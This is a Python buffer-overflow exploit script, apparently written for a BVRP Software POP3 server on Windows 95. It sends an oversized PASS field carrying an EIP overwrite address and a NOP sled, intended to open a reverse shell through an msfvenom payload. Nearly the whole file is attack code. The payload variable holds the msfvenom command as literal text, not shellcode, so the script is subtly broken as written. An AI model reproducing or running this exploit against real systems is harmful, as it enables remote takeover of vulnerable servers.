#!/usr/bin/python
# Overwriting EIP register like a boss & get reversed shell. Tested with a BVRP Software POP3 Server on a W95 machine.
# Please check our pattern-gen.sh script to create and find  the quantity of bytes needed to get to EIP
# by 0xbadchar

import socket, sys

HOST = sys.argv[1]
PORT = 110
buf = 'msfvenom -p windows/shell_reverse_tcp LHOST=<target> LPORT=443 -b "\x00\x0a\x0d\x20" EXITFUNC=thread -f python'
supreme_bytes = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" *(390-351) + buf
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    r = s.recv(1024)
    print(r)

    s.send("USER root \r\n")
    r = s.recv(1024)
    print(r)

    s.send("PASS "+supreme_bytes+"\r\n")
    r = s.recv(1024)
    print(r)

except:
    print("[!] Holy shit, we've got an error while trying to connect [!]")
